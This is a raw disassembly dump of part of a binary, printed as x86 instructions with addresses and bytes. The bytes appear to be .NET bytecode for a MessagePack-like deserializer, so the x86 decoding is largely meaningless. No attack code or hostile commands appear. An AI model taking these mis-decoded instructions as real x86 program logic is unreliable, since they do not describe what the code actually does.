  404c3d:	6f                   	outsl  %ds:(%esi),(%dx)
  404c3e:	26 00 00             	add    %al,%es:(%eax)
  404c41:	0a 0b                	or     (%ebx),%cl
  404c43:	14 0c                	adc    $0xc,%al
  404c45:	07                   	pop    %es
  404c46:	8e 3a                	mov    (%edx),%?
  404c48:	02 00                	add    (%eax),%al
  404c4a:	00 00                	add    %al,(%eax)
  404c4c:	14 2a                	adc    $0x2a,%al
  404c4e:	07                   	pop    %es
  404c4f:	8e 69 17             	mov    0x17(%ecx),%gs
  404c52:	3e 41                	ds inc %ecx
  404c54:	00 00                	add    %al,(%eax)
  404c56:	00 16                	add    %dl,(%esi)
  404c58:	0d 38 32 00 00       	or     $0x3238,%eax
  404c5d:	00 07                	add    %al,(%edi)
  404c5f:	09 a3 38 00 00 01    	or     %esp,0x1000038(%ebx)
  404c65:	0c 06                	or     $0x6,%al
  404c67:	08 6f 6e             	or     %ch,0x6e(%edi)
  404c6a:	00 00                	add    %al,(%eax)
  404c6c:	06                   	push   %es
  404c6d:	13 04 11             	adc    (%ecx,%edx,1),%eax
  404c70:	04 3a                	add    $0x3a,%al
  404c72:	13 00                	adc    (%eax),%eax
  404c74:	00 00                	add    %al,(%eax)
  404c76:	06                   	push   %es
  404c77:	6f                   	outsl  %ds:(%esi),(%dx)
  404c78:	6f                   	outsl  %ds:(%esi),(%dx)
  404c79:	00 00                	add    %al,(%eax)
  404c7b:	06                   	push   %es
  404c7c:	0a 06                	or     (%esi),%al
  404c7e:	08 6f 6a             	or     %ch,0x6a(%edi)
  404c81:	00 00                	add    %al,(%eax)
  404c83:	06                   	push   %es
  404c84:	38 03                	cmp    %al,(%ebx)
  404c86:	00 00                	add    %al,(%eax)
  404c88:	00 11                	add    %dl,(%ecx)
  404c8a:	04 0a                	add    $0xa,%al
  404c8c:	09 17                	or     %edx,(%edi)
  404c8e:	58                   	pop    %eax
  404c8f:	0d 09 07 8e 69       	or     $0x698e0709,%eax
  404c94:	17                   	pop    %ss
  404c95:	59                   	pop    %ecx
  404c96:	32 c6                	xor    %dh,%al
  404c98:	07                   	pop    %es
  404c99:	07                   	pop    %es
  404c9a:	8e 69 17             	mov    0x17(%ecx),%gs
  404c9d:	59                   	pop    %ecx
  404c9e:	a3 38 00 00 01       	mov    %eax,0x1000038
  404ca3:	0c 06                	or     $0x6,%al
  404ca5:	08 6f 6d             	or     %ch,0x6d(%edi)
  404ca8:	00 00                	add    %al,(%eax)
  404caa:	06                   	push   %es
  404cab:	13 05 11 05 15 3e    	adc    0x3e150511,%eax
  404cb1:	0e                   	push   %cs
  404cb2:	00 00                	add    %al,(%eax)
  404cb4:	00 06                	add    %al,(%esi)
  404cb6:	7b 38                	jnp    0x404cf0
  404cb8:	00 00                	add    %al,(%eax)
  404cba:	04 11                	add    $0x11,%al
  404cbc:	05 6f ea 00 00       	add    $0xea6f,%eax
  404cc1:	0a 2a                	or     (%edx),%ch
  404cc3:	06                   	push   %es
  404cc4:	6f                   	outsl  %ds:(%esi),(%dx)
  404cc5:	6f                   	outsl  %ds:(%esi),(%dx)
  404cc6:	00 00                	add    %al,(%eax)
  404cc8:	06                   	push   %es
  404cc9:	0a 06                	or     (%esi),%al
  404ccb:	08 6f 6a             	or     %ch,0x6a(%edi)
  404cce:	00 00                	add    %al,(%eax)
  404cd0:	06                   	push   %es
  404cd1:	06                   	push   %es
  404cd2:	2a 00                	sub    (%eax),%al
  404cd4:	1b 30                	sbb    (%eax),%esi
  404cd6:	04 00                	add    $0x0,%al
  404cd8:	3b 00                	cmp    (%eax),%eax
  404cda:	00 00                	add    %al,(%eax)
  404cdc:	24 00                	and    $0x0,%al
  404cde:	00 11                	add    %dl,(%ecx)
  404ce0:	73 d0                	jae    0x404cb2
  404ce2:	00 00                	add    %al,(%eax)
  404ce4:	0a 0a                	or     (%edx),%cl
  404ce6:	03 28                	add    (%eax),%ebp
  404ce8:	a2 00 00 06 10       	mov    %al,0x10060000
  404ced:	01 06                	add    %eax,(%esi)
  404cef:	03 16                	add    (%esi),%edx
  404cf1:	03 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%ecx
  404cf7:	00 0a                	add    %cl,(%edx)
  404cf9:	06                   	push   %es
  404cfa:	16                   	push   %ss
  404cfb:	6a 6f                	push   $0x6f
  404cfd:	4e                   	dec    %esi
  404cfe:	00 00                	add    %al,(%eax)
  404d00:	0a 02                	or     (%edx),%al
  404d02:	06                   	push   %es
  404d03:	28 88 00 00 06 dd    	sub    %cl,-0x22fa0000(%eax)
  404d09:	0d 00 00 00 06       	or     $0x6000000,%eax
  404d0e:	39 06                	cmp    %eax,(%esi)
  404d10:	00 00                	add    %al,(%eax)
  404d12:	00 06                	add    %al,(%esi)
  404d14:	6f                   	outsl  %ds:(%esi),(%dx)
  404d15:	33 00                	xor    (%eax),%eax
  404d17:	00 0a                	add    %cl,(%edx)
  404d19:	dc 2a                	fsubrl (%edx)
  404d1b:	00 01                	add    %al,(%ecx)
  404d1d:	10 00                	adc    %al,(%eax)
  404d1f:	00 02                	add    %al,(%edx)
  404d21:	00 06                	add    %al,(%esi)
  404d23:	00 27                	add    %ah,(%edi)
  404d25:	2d 00 0d 00 00       	sub    $0xd00,%eax
  404d2a:	00 00                	add    %al,(%eax)
  404d2c:	13 30                	adc    (%eax),%esi
  404d2e:	02 00                	add    (%eax),%al
  404d30:	16                   	push   %ss
  404d31:	00 00                	add    %al,(%eax)
  404d33:	00 25 00 00 11 03    	add    %ah,0x3110000
  404d39:	19 73 6c             	sbb    %esi,0x6c(%ebx)
  404d3c:	00 00                	add    %al,(%eax)
  404d3e:	0a 0a                	or     (%edx),%cl
  404d40:	02 06                	add    (%esi),%al
  404d42:	28 88 00 00 06 06    	sub    %cl,0x6060000(%eax)
  404d48:	6f                   	outsl  %ds:(%esi),(%dx)
  404d49:	40                   	inc    %eax
  404d4a:	00 00                	add    %al,(%eax)
  404d4c:	0a 2a                	or     (%edx),%ch
  404d4e:	00 00                	add    %al,(%eax)
  404d50:	13 30                	adc    (%eax),%esi
  404d52:	04 00                	add    $0x0,%al
  404d54:	07                   	pop    %es
  404d55:	06                   	push   %es
  404d56:	00 00                	add    %al,(%eax)
  404d58:	26 00 00             	add    %al,%es:(%eax)
  404d5b:	11 03                	adc    %eax,(%ebx)
  404d5d:	6f                   	outsl  %ds:(%esi),(%dx)
  404d5e:	00 01                	add    %al,(%ecx)
  404d60:	00 0a                	add    %cl,(%edx)
  404d62:	d2 0a                	rorb   %cl,(%edx)
  404d64:	14 0b                	adc    $0xb,%al
  404d66:	16                   	push   %ss
  404d67:	0c 16                	or     $0x16,%al
  404d69:	0d 06 1f 7f 3d       	or     $0x3d7f1f06,%eax
  404d6e:	09 00                	or     %eax,(%eax)
  404d70:	00 00                	add    %al,(%eax)
  404d72:	02 06                	add    (%esi),%al
  404d74:	6e                   	outsb  %ds:(%esi),(%dx)
  404d75:	28 74 00 00          	sub    %dh,0x0(%eax,%eax,1)
  404d79:	06                   	push   %es
  404d7a:	2a 06                	sub    (%esi),%al
  404d7c:	20 80 00 00 00 3f    	and    %al,0x3f000000(%eax)
  404d82:	48                   	dec    %eax
  404d83:	00 00                	add    %al,(%eax)
  404d85:	00 06                	add    %al,(%esi)
  404d87:	20 8f 00 00 00 3d    	and    %cl,0x3d000000(%edi)
  404d8d:	3d 00 00 00 02       	cmp    $0x2000000,%eax
  404d92:	28 6b 00             	sub    %ch,0x0(%ebx)
  404d95:	00 06                	add    %al,(%esi)
  404d97:	02 18                	add    (%eax),%bl
  404d99:	7d 36                	jge    0x404dd1
  404d9b:	00 00                	add    %al,(%eax)
  404d9d:	04 06                	add    $0x6,%al
  404d9f:	20 80 00 00 00 59    	and    %al,0x59000000(%eax)
  404da5:	0c 16                	or     $0x16,%al
  404da7:	0d 38 1c 00 00       	or     $0x1c38,%eax
  404dac:	00 02                	add    %al,(%edx)
  404dae:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  404db2:	06                   	push   %es
  404db3:	25 03 28 96 00       	and    $0x962803,%eax
  404db8:	00 06                	add    %al,(%esi)
  404dba:	6f                   	outsl  %ds:(%esi),(%dx)
  404dbb:	6a 00                	push   $0x0
  404dbd:	00 06                	add    %al,(%esi)
  404dbf:	03 6f 88             	add    -0x78(%edi),%ebp
  404dc2:	00 00                	add    %al,(%eax)
  404dc4:	06                   	push   %es
  404dc5:	09 17                	or     %edx,(%edi)
  404dc7:	58                   	pop    %eax
  404dc8:	0d 09 08 32 e0       	or     $0xe0320809,%eax
  404dcd:	2a 06                	sub    (%esi),%al
  404dcf:	20 90 00 00 00 3f    	and    %dl,0x3f000000(%eax)
  404dd5:	3c 00                	cmp    $0x0,%al
  404dd7:	00 00                	add    %al,(%eax)
  404dd9:	06                   	push   %es
  404dda:	20 9f 00 00 00 3d    	and    %bl,0x3d000000(%edi)
  404de0:	31 00                	xor    %eax,(%eax)
  404de2:	00 00                	add    %al,(%eax)
  404de4:	02 28                	add    (%eax),%ch
  404de6:	6b 00 00             	imul   $0x0,(%eax),%eax
  404de9:	06                   	push   %es
  404dea:	02 19                	add    (%ecx),%bl
  404dec:	7d 36                	jge    0x404e24
  404dee:	00 00                	add    %al,(%eax)
  404df0:	04 06                	add    $0x6,%al
  404df2:	20 90 00 00 00 59    	and    %dl,0x59000000(%eax)
  404df8:	0c 16                	or     $0x16,%al
  404dfa:	0d 38 10 00 00       	or     $0x1038,%eax
  404dff:	00 02                	add    %al,(%edx)
  404e01:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  404e05:	06                   	push   %es
  404e06:	03 6f 88             	add    -0x78(%edi),%ebp
  404e09:	00 00                	add    %al,(%eax)
  404e0b:	06                   	push   %es
  404e0c:	09 17                	or     %edx,(%edi)
  404e0e:	58                   	pop    %eax
  404e0f:	0d 09 08 32 ec       	or     $0xec320809,%eax
  404e14:	2a 06                	sub    (%esi),%al
  404e16:	20 a0 00 00 00 3f    	and    %ah,0x3f000000(%eax)
  404e1c:	21 00                	and    %eax,(%eax)
  404e1e:	00 00                	add    %al,(%eax)
  404e20:	06                   	push   %es
  404e21:	20 bf 00 00 00 3d    	and    %bh,0x3d000000(%edi)
  404e27:	16                   	push   %ss
  404e28:	00 00                	add    %al,(%eax)
  404e2a:	00 06                	add    %al,(%esi)
  404e2c:	20 a0 00 00 00 59    	and    %ah,0x59000000(%eax)
  404e32:	0c 02                	or     $0x2,%al
  404e34:	03 08                	add    (%eax),%ecx
  404e36:	28 95 00 00 06 28    	sub    %dl,0x28060000(%ebp)
  404e3c:	81 00 00 06 2a 06    	addl   $0x62a0600,(%eax)
  404e42:	20 e0                	and    %ah,%al
  404e44:	00 00                	add    %al,(%eax)
  404e46:	00 3f                	add    %bh,(%edi)
  404e48:	15 00 00 00 06       	adc    $0x6000000,%eax
  404e4d:	20 ff                	and    %bh,%bh
  404e4f:	00 00                	add    %al,(%eax)
  404e51:	00 3d 0a 00 00 00    	add    %bh,0xa
  404e57:	02 06                	add    (%esi),%al
  404e59:	67 6a 28             	addr16 push $0x28
  404e5c:	74 00                	je     0x404e5e
  404e5e:	00 06                	add    %al,(%esi)
  404e60:	2a 06                	sub    (%esi),%al
  404e62:	20 c0                	and    %al,%al
  404e64:	00 00                	add    %al,(%eax)
  404e66:	00 40 07             	add    %al,0x7(%eax)
  404e69:	00 00                	add    %al,(%eax)
  404e6b:	00 02                	add    %al,(%edx)
  404e6d:	28 80 00 00 06 2a    	sub    %al,0x2a060000(%eax)
  404e73:	06                   	push   %es
  404e74:	20 c1                	and    %al,%cl
  404e76:	00 00                	add    %al,(%eax)
  404e78:	00 40 0b             	add    %al,0xb(%eax)
  404e7b:	00 00                	add    %al,(%eax)
  404e7d:	00 72 56             	add    %dh,0x56(%edx)
  404e80:	27                   	daa
  404e81:	00 70 73             	add    %dh,0x73(%eax)
  404e84:	01 01                	add    %eax,(%ecx)
  404e86:	00 0a                	add    %cl,(%edx)
  404e88:	7a 06                	jp     0x404e90
  404e8a:	20 c2                	and    %al,%dl
  404e8c:	00 00                	add    %al,(%eax)
  404e8e:	00 40 08             	add    %al,0x8(%eax)
  404e91:	00 00                	add    %al,(%eax)
  404e93:	00 02                	add    %al,(%edx)
  404e95:	16                   	push   %ss
  404e96:	28 83 00 00 06 2a    	sub    %al,0x2a060000(%ebx)
  404e9c:	06                   	push   %es
  404e9d:	20 c3                	and    %al,%bl
  404e9f:	00 00                	add    %al,(%eax)
  404ea1:	00 40 08             	add    %al,0x8(%eax)
  404ea4:	00 00                	add    %al,(%eax)
  404ea6:	00 02                	add    %al,(%edx)
  404ea8:	17                   	pop    %ss
  404ea9:	28 83 00 00 06 2a    	sub    %al,0x2a060000(%ebx)
  404eaf:	06                   	push   %es
  404eb0:	20 c4                	and    %al,%ah
  404eb2:	00 00                	add    %al,(%eax)
  404eb4:	00 40 20             	add    %al,0x20(%eax)
  404eb7:	00 00                	add    %al,(%eax)
  404eb9:	00 03                	add    %al,(%ebx)
  404ebb:	6f                   	outsl  %ds:(%esi),(%dx)
  404ebc:	00 01                	add    %al,(%ecx)
  404ebe:	00 0a                	add    %cl,(%edx)
  404ec0:	0c 08                	or     $0x8,%al
  404ec2:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404ec6:	01 0b                	add    %ecx,(%ebx)
  404ec8:	03 07                	add    (%edi),%eax
  404eca:	16                   	push   %ss
  404ecb:	08 6f 45             	or     %ch,0x45(%edi)
  404ece:	00 00                	add    %al,(%eax)
  404ed0:	0a 26                	or     (%esi),%ah
  404ed2:	02 07                	add    (%edi),%al
  404ed4:	28 79 00             	sub    %bh,0x0(%ecx)
  404ed7:	00 06                	add    %al,(%esi)
  404ed9:	2a 06                	sub    (%esi),%al
  404edb:	20 c5                	and    %al,%ch
  404edd:	00 00                	add    %al,(%eax)
  404edf:	00 40 39             	add    %al,0x39(%eax)
  404ee2:	00 00                	add    %al,(%eax)
  404ee4:	00 18                	add    %bl,(%eax)
  404ee6:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404eea:	01 0b                	add    %ecx,(%ebx)
  404eec:	03 07                	add    (%edi),%eax
  404eee:	16                   	push   %ss
  404eef:	18 6f 45             	sbb    %ch,0x45(%edi)
  404ef2:	00 00                	add    %al,(%eax)
  404ef4:	0a 26                	or     (%esi),%ah
  404ef6:	07                   	pop    %es
  404ef7:	28 58 00             	sub    %bl,0x0(%eax)
  404efa:	00 06                	add    %al,(%esi)
  404efc:	0b 07                	or     (%edi),%eax
  404efe:	16                   	push   %ss
  404eff:	28 02                	sub    %al,(%edx)
  404f01:	01 00                	add    %eax,(%eax)
  404f03:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  404f06:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404f0a:	01 0b                	add    %ecx,(%ebx)
  404f0c:	03 07                	add    (%edi),%eax
  404f0e:	16                   	push   %ss
  404f0f:	08 6f 45             	or     %ch,0x45(%edi)
  404f12:	00 00                	add    %al,(%eax)
  404f14:	0a 26                	or     (%esi),%ah
  404f16:	02 07                	add    (%edi),%al
  404f18:	28 79 00             	sub    %bh,0x0(%ecx)
  404f1b:	00 06                	add    %al,(%esi)
  404f1d:	2a 06                	sub    (%esi),%al
  404f1f:	20 c6                	and    %al,%dh
  404f21:	00 00                	add    %al,(%eax)
  404f23:	00 40 39             	add    %al,0x39(%eax)
  404f26:	00 00                	add    %al,(%eax)
  404f28:	00 1a                	add    %bl,(%edx)
  404f2a:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404f2e:	01 0b                	add    %ecx,(%ebx)
  404f30:	03 07                	add    (%edi),%eax
  404f32:	16                   	push   %ss
  404f33:	1a 6f 45             	sbb    0x45(%edi),%ch
  404f36:	00 00                	add    %al,(%eax)
  404f38:	0a 26                	or     (%esi),%ah
  404f3a:	07                   	pop    %es
  404f3b:	28 58 00             	sub    %bl,0x0(%eax)
  404f3e:	00 06                	add    %al,(%esi)
  404f40:	0b 07                	or     (%edi),%eax
  404f42:	16                   	push   %ss
  404f43:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  404f47:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  404f4a:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404f4e:	01 0b                	add    %ecx,(%ebx)
  404f50:	03 07                	add    (%edi),%eax
  404f52:	16                   	push   %ss
  404f53:	08 6f 45             	or     %ch,0x45(%edi)
  404f56:	00 00                	add    %al,(%eax)
  404f58:	0a 26                	or     (%esi),%ah
  404f5a:	02 07                	add    (%edi),%al
  404f5c:	28 79 00             	sub    %bh,0x0(%ecx)
  404f5f:	00 06                	add    %al,(%esi)
  404f61:	2a 06                	sub    (%esi),%al
  404f63:	20 c7                	and    %al,%bh
  404f65:	00 00                	add    %al,(%eax)
  404f67:	00 3b                	add    %bh,(%ebx)
  404f69:	16                   	push   %ss
  404f6a:	00 00                	add    %al,(%eax)
  404f6c:	00 06                	add    %al,(%esi)
  404f6e:	20 c8                	and    %cl,%al
  404f70:	00 00                	add    %al,(%eax)
  404f72:	00 3b                	add    %bh,(%ebx)
  404f74:	0b 00                	or     (%eax),%eax
  404f76:	00 00                	add    %al,(%eax)
  404f78:	06                   	push   %es
  404f79:	20 c9                	and    %cl,%cl
  404f7b:	00 00                	add    %al,(%eax)
  404f7d:	00 40 0b             	add    %al,0xb(%eax)
  404f80:	00 00                	add    %al,(%eax)
  404f82:	00 72 82             	add    %dh,-0x7e(%edx)
  404f85:	27                   	daa
  404f86:	00 70 73             	add    %dh,0x73(%eax)
  404f89:	01 01                	add    %eax,(%ecx)
  404f8b:	00 0a                	add    %cl,(%edx)
  404f8d:	7a 06                	jp     0x404f95
  404f8f:	20 ca                	and    %cl,%dl
  404f91:	00 00                	add    %al,(%eax)
  404f93:	00 40 26             	add    %al,0x26(%eax)
  404f96:	00 00                	add    %al,(%eax)
  404f98:	00 1a                	add    %bl,(%edx)
  404f9a:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404f9e:	01 0b                	add    %ecx,(%ebx)
  404fa0:	03 07                	add    (%edi),%eax
  404fa2:	16                   	push   %ss
  404fa3:	1a 6f 45             	sbb    0x45(%edi),%ch
  404fa6:	00 00                	add    %al,(%eax)
  404fa8:	0a 26                	or     (%esi),%ah
  404faa:	07                   	pop    %es
  404fab:	28 58 00             	sub    %bl,0x0(%eax)
  404fae:	00 06                	add    %al,(%esi)
  404fb0:	0b 02                	or     (%edx),%eax
  404fb2:	07                   	pop    %es
  404fb3:	16                   	push   %ss
  404fb4:	28 03                	sub    %al,(%ebx)
  404fb6:	01 00                	add    %eax,(%eax)
  404fb8:	0a 28                	or     (%eax),%ch
  404fba:	84 00                	test   %al,(%eax)
  404fbc:	00 06                	add    %al,(%esi)
  404fbe:	2a 06                	sub    (%esi),%al
  404fc0:	20 cb                	and    %cl,%bl
  404fc2:	00 00                	add    %al,(%eax)
  404fc4:	00 40 26             	add    %al,0x26(%eax)
  404fc7:	00 00                	add    %al,(%eax)
  404fc9:	00 1e                	add    %bl,(%esi)
  404fcb:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404fcf:	01 0b                	add    %ecx,(%ebx)
  404fd1:	03 07                	add    (%edi),%eax
  404fd3:	16                   	push   %ss
  404fd4:	1e                   	push   %ds
  404fd5:	6f                   	outsl  %ds:(%esi),(%dx)
  404fd6:	45                   	inc    %ebp
  404fd7:	00 00                	add    %al,(%eax)
  404fd9:	0a 26                	or     (%esi),%ah
  404fdb:	07                   	pop    %es
  404fdc:	28 58 00             	sub    %bl,0x0(%eax)
  404fdf:	00 06                	add    %al,(%esi)
  404fe1:	0b 02                	or     (%edx),%eax
  404fe3:	07                   	pop    %es
  404fe4:	16                   	push   %ss
  404fe5:	28 04 01             	sub    %al,(%ecx,%eax,1)
  404fe8:	00 0a                	add    %cl,(%edx)
  404fea:	28 85 00 00 06 2a    	sub    %al,0x2a060000(%ebp)
  404ff0:	06                   	push   %es
  404ff1:	20 cc                	and    %cl,%ah
  404ff3:	00 00                	add    %al,(%eax)
  404ff5:	00 40 11             	add    %al,0x11(%eax)
  404ff8:	00 00                	add    %al,(%eax)
  404ffa:	00 03                	add    %al,(%ebx)
  404ffc:	6f                   	outsl  %ds:(%esi),(%dx)
  404ffd:	00 01                	add    %al,(%ecx)
  404fff:	00 0a                	add    %cl,(%edx)
  405001:	d2 0a                	rorb   %cl,(%edx)
  405003:	02 06                	add    (%esi),%al
  405005:	6e                   	outsb  %ds:(%esi),(%dx)
  405006:	28 74 00 00          	sub    %dh,0x0(%eax,%eax,1)
  40500a:	06                   	push   %es
  40500b:	2a 06                	sub    (%esi),%al
  40500d:	20 cd                	and    %cl,%ch
  40500f:	00 00                	add    %al,(%eax)
  405011:	00 40 27             	add    %al,0x27(%eax)
  405014:	00 00                	add    %al,(%eax)
  405016:	00 18                	add    %bl,(%eax)
  405018:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  40501c:	01 0b                	add    %ecx,(%ebx)
  40501e:	03 07                	add    (%edi),%eax
  405020:	16                   	push   %ss
  405021:	18 6f 45             	sbb    %ch,0x45(%edi)
  405024:	00 00                	add    %al,(%eax)
  405026:	0a 26                	or     (%esi),%ah
  405028:	07                   	pop    %es
  405029:	28 58 00             	sub    %bl,0x0(%eax)
  40502c:	00 06                	add    %al,(%esi)
  40502e:	0b 02                	or     (%edx),%eax
  405030:	07                   	pop    %es
  405031:	16                   	push   %ss
  405032:	28 02                	sub    %al,(%edx)
  405034:	01 00                	add    %eax,(%eax)
  405036:	0a 6e 28             	or     0x28(%esi),%ch
  405039:	74 00                	je     0x40503b
  40503b:	00 06                	add    %al,(%esi)
  40503d:	2a 06                	sub    (%esi),%al
  40503f:	20 ce                	and    %cl,%dh
  405041:	00 00                	add    %al,(%eax)
  405043:	00 40 27             	add    %al,0x27(%eax)
  405046:	00 00                	add    %al,(%eax)
  405048:	00 1a                	add    %bl,(%edx)
  40504a:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  40504e:	01 0b                	add    %ecx,(%ebx)
  405050:	03 07                	add    (%edi),%eax
  405052:	16                   	push   %ss
  405053:	1a 6f 45             	sbb    0x45(%edi),%ch
  405056:	00 00                	add    %al,(%eax)
  405058:	0a 26                	or     (%esi),%ah
  40505a:	07                   	pop    %es
  40505b:	28 58 00             	sub    %bl,0x0(%eax)
  40505e:	00 06                	add    %al,(%esi)
  405060:	0b 02                	or     (%edx),%eax
  405062:	07                   	pop    %es
  405063:	16                   	push   %ss
  405064:	28 05 01 00 0a 6e    	sub    %al,0x6e0a0001
  40506a:	28 74 00 00          	sub    %dh,0x0(%eax,%eax,1)
  40506e:	06                   	push   %es
  40506f:	2a 06                	sub    (%esi),%al
  405071:	20 cf                	and    %cl,%bh
  405073:	00 00                	add    %al,(%eax)
  405075:	00 40 26             	add    %al,0x26(%eax)
  405078:	00 00                	add    %al,(%eax)
  40507a:	00 1e                	add    %bl,(%esi)
  40507c:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  405080:	01 0b                	add    %ecx,(%ebx)
  405082:	03 07                	add    (%edi),%eax
  405084:	16                   	push   %ss
  405085:	1e                   	push   %ds
  405086:	6f                   	outsl  %ds:(%esi),(%dx)
  405087:	45                   	inc    %ebp
  405088:	00 00                	add    %al,(%eax)
  40508a:	0a 26                	or     (%esi),%ah
  40508c:	07                   	pop    %es
  40508d:	28 58 00             	sub    %bl,0x0(%eax)
  405090:	00 06                	add    %al,(%esi)
  405092:	0b 02                	or     (%edx),%eax
  405094:	07                   	pop    %es
  405095:	16                   	push   %ss
  405096:	28 06                	sub    %al,(%esi)
  405098:	01 00                	add    %eax,(%eax)
  40509a:	0a 28                	or     (%eax),%ch
  40509c:	75 00                	jne    0x40509e
  40509e:	00 06                	add    %al,(%esi)
  4050a0:	2a 06                	sub    (%esi),%al
  4050a2:	20 dc                	and    %bl,%ah
  4050a4:	00 00                	add    %al,(%eax)
  4050a6:	00 40 49             	add    %al,0x49(%eax)
  4050a9:	00 00                	add    %al,(%eax)
  4050ab:	00 18                	add    %bl,(%eax)
  4050ad:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4050b1:	01 0b                	add    %ecx,(%ebx)
  4050b3:	03 07                	add    (%edi),%eax
  4050b5:	16                   	push   %ss
  4050b6:	18 6f 45             	sbb    %ch,0x45(%edi)
  4050b9:	00 00                	add    %al,(%eax)
  4050bb:	0a 26                	or     (%esi),%ah
  4050bd:	07                   	pop    %es
  4050be:	28 58 00             	sub    %bl,0x0(%eax)
  4050c1:	00 06                	add    %al,(%esi)
  4050c3:	0b 07                	or     (%edi),%eax
  4050c5:	16                   	push   %ss
  4050c6:	28 07                	sub    %al,(%edi)
  4050c8:	01 00                	add    %eax,(%eax)
  4050ca:	0a 0c 02             	or     (%edx,%eax,1),%cl
  4050cd:	28 6b 00             	sub    %ch,0x0(%ebx)
  4050d0:	00 06                	add    %al,(%esi)
  4050d2:	02 19                	add    (%ecx),%bl
  4050d4:	7d 36                	jge    0x40510c
  4050d6:	00 00                	add    %al,(%eax)
  4050d8:	04 16                	add    $0x16,%al
  4050da:	0d 38 10 00 00       	or     $0x1038,%eax
  4050df:	00 02                	add    %al,(%edx)
  4050e1:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  4050e5:	06                   	push   %es
  4050e6:	03 6f 88             	add    -0x78(%edi),%ebp
  4050e9:	00 00                	add    %al,(%eax)
  4050eb:	06                   	push   %es
  4050ec:	09 17                	or     %edx,(%edi)
  4050ee:	58                   	pop    %eax
  4050ef:	0d 09 08 32 ec       	or     $0xec320809,%eax
  4050f4:	2a 06                	sub    (%esi),%al
  4050f6:	20 dd                	and    %bl,%ch
  4050f8:	00 00                	add    %al,(%eax)
  4050fa:	00 40 49             	add    %al,0x49(%eax)
  4050fd:	00 00                	add    %al,(%eax)
  4050ff:	00 1a                	add    %bl,(%edx)
  405101:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  405105:	01 0b                	add    %ecx,(%ebx)
  405107:	03 07                	add    (%edi),%eax
  405109:	16                   	push   %ss
  40510a:	1a 6f 45             	sbb    0x45(%edi),%ch
  40510d:	00 00                	add    %al,(%eax)
  40510f:	0a 26                	or     (%esi),%ah
  405111:	07                   	pop    %es
  405112:	28 58 00             	sub    %bl,0x0(%eax)
  405115:	00 06                	add    %al,(%esi)
  405117:	0b 07                	or     (%edi),%eax
  405119:	16                   	push   %ss
  40511a:	28 07                	sub    %al,(%edi)
  40511c:	01 00                	add    %eax,(%eax)
  40511e:	0a 0c 02             	or     (%edx,%eax,1),%cl
  405121:	28 6b 00             	sub    %ch,0x0(%ebx)
  405124:	00 06                	add    %al,(%esi)
  405126:	02 19                	add    (%ecx),%bl
  405128:	7d 36                	jge    0x405160
  40512a:	00 00                	add    %al,(%eax)
  40512c:	04 16                	add    $0x16,%al
  40512e:	0d 38 10 00 00       	or     $0x1038,%eax
  405133:	00 02                	add    %al,(%edx)
  405135:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  405139:	06                   	push   %es
  40513a:	03 6f 88             	add    -0x78(%edi),%ebp
  40513d:	00 00                	add    %al,(%eax)
  40513f:	06                   	push   %es
  405140:	09 17                	or     %edx,(%edi)
  405142:	58                   	pop    %eax
  405143:	0d 09 08 32 ec       	or     $0xec320809,%eax
  405148:	2a 06                	sub    (%esi),%al
  40514a:	20 d9                	and    %bl,%cl
  40514c:	00 00                	add    %al,(%eax)
  40514e:	00 40 0e             	add    %al,0xe(%eax)
  405151:	00 00                	add    %al,(%eax)
  405153:	00 02                	add    %al,(%edx)
  405155:	06                   	push   %es
  405156:	03 28                	add    (%eax),%ebp
  405158:	97                   	xchg   %eax,%edi
  405159:	00 00                	add    %al,(%eax)
  40515b:	06                   	push   %es
  40515c:	28 81 00 00 06 2a    	sub    %al,0x2a060000(%ecx)
  405162:	06                   	push   %es
  405163:	20 de                	and    %bl,%dh
  405165:	00 00                	add    %al,(%eax)
  405167:	00 40 55             	add    %al,0x55(%eax)
  40516a:	00 00                	add    %al,(%eax)
  40516c:	00 18                	add    %bl,(%eax)
  40516e:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  405172:	01 0b                	add    %ecx,(%ebx)
  405174:	03 07                	add    (%edi),%eax
  405176:	16                   	push   %ss
  405177:	18 6f 45             	sbb    %ch,0x45(%edi)
  40517a:	00 00                	add    %al,(%eax)
  40517c:	0a 26                	or     (%esi),%ah
  40517e:	07                   	pop    %es
  40517f:	28 58 00             	sub    %bl,0x0(%eax)
  405182:	00 06                	add    %al,(%esi)
  405184:	0b 07                	or     (%edi),%eax
  405186:	16                   	push   %ss
  405187:	28 07                	sub    %al,(%edi)
  405189:	01 00                	add    %eax,(%eax)
  40518b:	0a 0c 02             	or     (%edx,%eax,1),%cl
  40518e:	28 6b 00             	sub    %ch,0x0(%ebx)
  405191:	00 06                	add    %al,(%esi)
  405193:	02 18                	add    (%eax),%bl
  405195:	7d 36                	jge    0x4051cd
  405197:	00 00                	add    %al,(%eax)
  405199:	04 16                	add    $0x16,%al
  40519b:	0d 38 1c 00 00       	or     $0x1c38,%eax
  4051a0:	00 02                	add    %al,(%edx)
  4051a2:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  4051a6:	06                   	push   %es
  4051a7:	25 03 28 96 00       	and    $0x962803,%eax
  4051ac:	00 06                	add    %al,(%esi)
  4051ae:	6f                   	outsl  %ds:(%esi),(%dx)
  4051af:	6a 00                	push   $0x0
  4051b1:	00 06                	add    %al,(%esi)
  4051b3:	03 6f 88             	add    -0x78(%edi),%ebp
  4051b6:	00 00                	add    %al,(%eax)
